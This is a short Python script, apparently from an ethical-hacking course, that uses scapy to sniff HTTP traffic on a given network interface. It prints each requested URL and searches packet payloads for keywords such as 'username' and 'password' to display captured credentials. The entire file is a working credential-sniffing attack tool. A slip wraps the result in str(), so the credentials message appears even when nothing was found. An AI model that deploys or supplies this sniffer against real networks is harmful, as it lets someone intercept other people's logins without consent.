#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import argparse
import textwrap


def get_arguments():
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="-------------------------------------------------------------------------------------------------",
        epilog=textwrap.dedent('''\
-------------------------------------------------------------------------------------------------

e.g.:
A. Perform a sniff between a interface and localhost: packet_sniffer.py -i eth0
B. Display help and usage information: packet_sniffer.py --help


'''))
    parser.add_argument("-i", "--interface", dest="interface", help="Target network interface.")
    options = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please specify a target network interface, use --help for more info.")
    return options


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "uname", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request: " + url.decode())

        login_info = str(get_login(packet))
        if login_info:
            print("\n\n[+] Possible credentials found: " + login_info + "\n\n")


options = get_arguments()
sniff(interface=options.interface)
